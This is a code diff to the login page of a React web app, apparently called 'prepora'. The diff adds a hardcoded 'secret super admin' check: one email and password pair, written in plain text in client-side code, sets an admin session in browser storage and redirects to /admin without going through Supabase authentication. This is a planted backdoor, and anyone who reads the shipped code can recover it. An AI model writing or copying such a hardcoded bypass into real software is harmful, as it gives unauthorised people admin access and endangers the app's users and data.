@@ -19,6 +19,17 @@ export default function LoginPage() {
     setLoading(true);
     setErrorMsg('');
 
+    const cleanEmail = email.trim().toLowerCase();
+    const cleanPassword = password.trim();
+
+    // Secret Super Admin Authentication
+    if (cleanEmail === 'xurshid_admin@gmail.com' && cleanPassword === '13131313') {
+      StorageManager.setAdminSession(true);
+      window.dispatchEvent(new Event('prepora_auth_changed'));
+      router.push('/admin');
+      return;
+    }
+
     if (isSupabaseConfigured && supabase) {
       try {
         const { error } = await supabase.auth.signInWithPassword({ email, password });
